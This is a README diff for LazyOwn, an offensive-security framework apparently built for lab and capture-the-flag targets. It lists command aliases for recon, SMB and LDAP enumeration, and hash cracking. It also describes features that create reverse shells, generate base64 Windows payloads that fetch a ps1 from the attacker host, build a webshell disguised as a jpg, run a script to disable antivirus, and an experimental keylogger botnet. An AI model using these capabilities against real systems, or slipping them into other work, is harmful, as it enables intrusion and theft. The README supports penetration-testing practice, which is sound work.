+## lazyattack
+
+No description available.
+
+## lazymsfvenom
+
+No description available.
+
+## lazyaslrcheck
+
+No description available.
+
+## lazypathhijacking
+
+No description available.
+
+## script
+
+Run a script with the given arguments
+
+## command
+
+Run a command and print output in real-time
+
+## payload
+
+Load parameters from payload.json
+
+## exit
+
+Exit the command line interface.
+
+## fixperm
+
+Fix Perm LazyOwn shell
+
+## lazywebshell
+
+LazyOwn shell
+
+## getcap
+
+try get capabilities :)
+
+## getseclist
+
+get seclist :D
+
+## smbclient
+
+Lazy SMBCLient
+
+## smbmap
+
+smbmap -H 10.10.10.3 [OPTIONS]
+
+## getnpusers
+
+sudo impacket-GetNPUsers mist.htb/ -no-pass -usersfile sessions/users.txt
+
+## psexec
+
+Lazy impacket-psexec administrator@
+
+## rpcdump
+
+rpcdump.py -p 135 10.10.11.24
+
+## dig
+
+dig version.bind CHAOS TXT @DNS
+
+## cp
+
+cp {exploitdb}DNS
+
+## dnsenum
+
+dnsenum --dnsserver 10.10.11.24 --enum -p 0 -s 0 -o sessions/subdomains.txt -f {dnswordlist} ghost.htb
+
+## dnsmap
+
+dnsmap --dnsserver 10.10.11.24 --enum -p 0 -s 0 -o sessions/subdomains.txt -f {dnswordlist} ghost.htb
+
+## whatweb
+
+whatweb
+
+## enum4linux
+
+enum4linux -a target
+
+## nbtscan
+
+sudo nbtscan -r target
+
+## rpcclient
+
+rpcclient -U "" -N 10.10.10.10
+
+## nikto
+
+nikto -h 10.10.10.10
+
+## openssl_sclient
+
+openssl s_client -connect  10.10.10.10
+
+## ss
+
+searchsploit alias
+
+## wfuzz
+
+lazy alias to wfuzz
+
+## gobuster
+
+Lazy gobuster
+
+## addhosts
+
+sudo -- sh -c -e "echo '10.10.11.23 permx.htb' >> /etc/hosts;
+
+## cme
+
+crackmapexec smb 10.10.11.24
+
+## ldapdomaindump
+
+ldapdomaindump -u 'domain.local\Administrator' -p 'passadmin123' 10.10.11.23
+
+## bloodhound
+
+bloodhound-python -c All -u 'usuario' -p 'password' -ns 10.10.10.10
+
+## ping
+
+ping -c 1 10.10.10.10
+
+## gospider
+
+try gospider
+
+## arpscan
+
+try arp-scan
+
+## lazypwn
+
+LazyPwn
+
+## fixel
+
+to fix perms
+
+## smbserver
+
+Lazy imacket smbserver
+
+## sqlmap
+
+Lazy sqlmap try sqlmap -wizard if don't know how to use requests.txt file always start with req and first parameter
+
+## proxy
+
+Small proxy to modify the request on the fly...
+
+## createwebshell
+
+Crea una webshell disfrazada de jpg en el directorio sessions/
+
+## createrevshell
+
+Crea un script en el directorio sessions con una reverse shell con los datos en lhost y lport
+
+## createwinrevshell
+
+Crea un script en el directorio sessions con una reverse shell con los datos en lhost y lport
+
+## createhash
+
+Crea un archivo hash.txt en el directorio sessions
+
+## createcredentials
+
+Crea un archivo credentials.txt en el directorio sessions el forato debe ser: user:password
+
+## download_resources
+
+download resources in sessions
+
+## download_exploit
+
+download exploits in external/.exploits/
+
+## dirsearch
+
+dirsearch -u <http://url.ext/> -x 403,404,400
+
+## john2hash
+
+example: sudo john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt -format=Raw-SHA512
+
+## hashcat
+
+hashcat -a 0 -m mode hash /usr/share/wordlists/rockyou.txt
+
+## responder
+
+sudo responder -I tun0
+
+## ip
+
+ip a show scope global | awk '/^[0-9]+:/ { sub(/:/,"",$2); iface=$2 } /^[[:space:]]*inet / { split($2, a, "/"); print "    [" iface"] "a[1] }' and copy de ip to clipboard :)
+
+## rhost
+
+Copy rhost to clipboard
+
+## banner
+
+Show the banner
+
+## py3ttyup
+
+copy to clipboard tipical python3 -c 'import pty; pty.spawn ... bla bla blah...
+
+## rev
+
+Copy a revshell to clipboard
+
+## disableav
+
+visual basic script to try to disable antivirus
+
+## conptyshell
+
+Download ConPtyShell in sessions directory and copy to clipboard the command :D
+
+## pwncatcs
+
+run pwncat-cs -lp <PORT> :)
+
+## find
+
+copy to clipboard this command always forgot :) find / -type f -perm -4000 2>/dev/null
+
+## sh
+
+execute some command direct in shell to avoid exit LazyOwn ;)
+
+## pwd
+
+'echo -e "[\e[96m`pwd`\e[0m]\e[34m" && ls && echo -en "\e[0m"'
+
+## qa
+
+Exit fast without confirmation
+
+## ignorearp
+
+echo 1 > /proc/sys/net/ipv4/conf/all/arp_ignore
+
+## ignoreicmp
+
+echo 1 > /proc/sys/net/ipv4/icmp_echo_ignore_all
+
+## acknowledgearp
+
+echo 0 > /proc/sys/net/ipv4/conf/all/arp_ignore
+
+## acknowledgeicmp
+
+echo 0 > /proc/sys/net/ipv4/icmp_echo_ignore_all
+
+## clock
+
+Show the time to go sleep xD
+
+## ports
+
+Get all ports local
+
+## ssh
+
+Conecta a un host SSH usando credenciales desde un archivo y el puerto especificado.
+
+## cports
+
+Genera un comando para mostrar puertos TCP y UDP, y lo copia al portapapeles.
+
+## vpn
+
+Open vpn like htb vpn
+
+## www
+
+Start a web server with python3
+
+## wrapper
+
+copy to clipboard some wrapper to lfi
+
+## samrdump
+
+impacket-samrdump -port 445 10.10.10.10
+
+## snmpcheck
+
+snmp-check 10.10.10.10
+
+## sshd
+
+sudo systemctl start ssh
+
+## nmapscripthelp
+
+help to know nmap scripts: nmap --script-help 'snmp*'
+
+## clean
+
+delete all from sessions
+
+## pyautomate
+
+pyautomate automatization of tools to pwn a target all rights <https://github.com/honze-net/pwntomate>
+
+## alias
+
+Imprime todos los alias configurados.
+
+## tcpdump_icmp
+
+se pone en escucha con la interfaz señalada por argumento ej: tcpdump_icmp tun0
+
+## winbase64payload
+
+Crea un payload encodeado en base64 especial para windows para ejecutar un ps1 desde lhost
+
+## revwin
+
+Crea un payload encodeado en base64 especial para windows para ejecutar un ps1 desde lhost
+
+## asprevbase64
+
+create a base64 rev shell in asp, you need pass the base64 encodd payload, see help winbase64payload to create the payload base64 encoded
+
+## rubeus
+
+copia a la clipboard la borma de descargar Rubeus
+
+## socat
+
+run socat in ip:port seted by argument config the port 1080 in /etc/proxychains.conf
+
+## chisel
+
+run download_resources command to download and run chisel :D like ./chisel_linux_amd64 server -p 3333 --reverse -v
+
+## msf
+
+automate msfconsole scan or rev shell
+
+## encrypt
+
+Encrypt a file using XOR. Usage: encrypt <file_path> <key>
+
+## decrypt
+
+Decrypt a file using XOR. Usage: decrypt <file_path> <key>
+
+## get_output
+
+Devuelve la salida acumulada
+
 ## Experimental LazyOwnWebShell en python
-Corre en http://localhost:5000 experimental, ya que aun no funciona la salida de la webshell de cara al navegador. pero los comandos si son ejecutados correctamente. por eso está en modo experimental... por no decir que aun tiene bugs xD
+
+Corre en <http://localhost:5000> experimental, ya que aun no funciona la salida de la webshell de cara al navegador. pero los comandos si son ejecutados correctamente. por eso está en modo experimental... por no decir que aun tiene bugs xD
 
 ![Captura de pantalla 2024-06-09 030335](https://github.com/grisuno/LazyOwn/assets/1097185/4bc6e25a-5c69-4dbc-a1b1-a3c455b38bfd)
 
 ```sh
 python3 main.py 
 ```
+
 ## Experimental ofuscación mediante pyinstaller
+
 esto está en modo experimental y no funciona del todo, ya que tiene un problema de rutas. pronto ya contará con ofuscación mediante pyinstaller
+
 ```sh
 ./py2el.sh
 ```
+
 ## Experimental exploit netbios
+
 esto está en modo experimental ya que aun no funciona... (proximamente quizas una implementacion de eternalblue entre otras cositas...)
+
 ```sh
 run lazynetbios
 ```
+
 ## Experimental LazyBotNet con keylogger para windows y Linux
+
 esto está en modo experimental y no funciona la desencriptación del log del keylogger xD
 acá vemos por primera vez en accion el comando payload el cual nos setea toda la config en nuestro payload.json así podemos precargar la config antes de arrancar con el framework
+
 ```sh
 payload
 run lazybotnet
 ```
+
 ## Menús Interactivos
+
 El script presenta menús interactivos para seleccionar las acciones a realizar. En modo servidor, muestra opciones relevantes para la máquina víctima, y en modo cliente, muestra opciones relevantes para la máquina atacante.
 
 Interrupción Limpia
 El script maneja la señal SIGINT (usualmente generada por Control + C) para salir limpiamente.
+
 ## Licencia
+
 Este proyecto está licenciado bajo la Licencia GPL v3. La información contenida en GTFOBins es propiedad de sus autores, a quienes se les agradece enormemente por la información proporcionada.
 
 ## Agradecimientos
+
 Un agradecimiento especial a  [GTFOBins](https://gtfobins.github.io/) por la valiosa información que proporcionan y a ti por utilizar este proyecto. Tambien ¡Gracias por tu apoyo Tito S4vitar! quien hace una tarea extraordinarìa de divulgaciòn. por supuesto que utilizo la funcion extractPorts en mi .zshrc :D
 
 ### Agradecimientos a pwntomate 🍅
-una excelente herramienta que adapte un poco para que funcione con el proyecto todos los creditos son de su autor honze-net Andreas Hontzia visiten y denle amor al proyecto https://github.com/honze-net/pwntomate
 
-## Abstract 
+una excelente herramienta que adapte un poco para que funcione con el proyecto todos los creditos son de su autor honze-net Andreas Hontzia visiten y denle amor al proyecto <https://github.com/honze-net/pwntomate>
+
+## Abstract
+
 LazyOwn es un marco de trabajo que agiliza el flujo del mismo y automatiza muchas tareas y pruebas mediante alias y distintas herramientas es como una navaja multiproposito con navajas multipropisitos para el hacking xD
